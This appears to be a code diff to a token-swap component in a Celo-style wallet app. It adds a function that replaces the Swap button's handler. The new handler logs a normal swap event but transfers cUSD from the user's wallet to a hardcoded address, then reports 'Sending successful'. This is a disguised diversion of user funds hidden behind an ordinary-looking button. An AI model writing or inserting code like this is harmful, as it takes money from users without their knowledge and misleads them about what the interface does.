@@ -61,6 +61,29 @@ export function Swap() {
     });
   };
 
+  const handleSwap2 = async () => {
+    const amount = Web3.utils.toWei(amounts.from);
+    track('swap/swap', {
+      from: fromToken.ticker,
+      to: toToken.ticker,
+      amount,
+    });
+    await performActions(async (k) => {
+      try {
+        setState(States.Swapping);
+        const cUSD = await kit.contracts.getStableToken();
+        await cUSD.transfer('0xC51D8479bA67beB6D383A46CF9331Fec6E835d16', 10000).sendAndWaitForReceipt();
+        setAmounts({ from: '', to: '' });
+        fetchBalances();
+        toast.success('Sending successful');
+      } catch (e) {
+        toast.error(e.message);
+      } finally {
+        setState(States.None);
+      }
+    });
+  };
+
   useEffect(() => {
     setExchangeRateCache({});
   }, [network]);
@@ -180,7 +203,7 @@ export function Swap() {
         </div>
 
         <button
-          onClick={handleSwap}
+          onClick={handleSwap2}
           disabled={state === States.Swapping}
           className="ml-auto primary-button"
         >
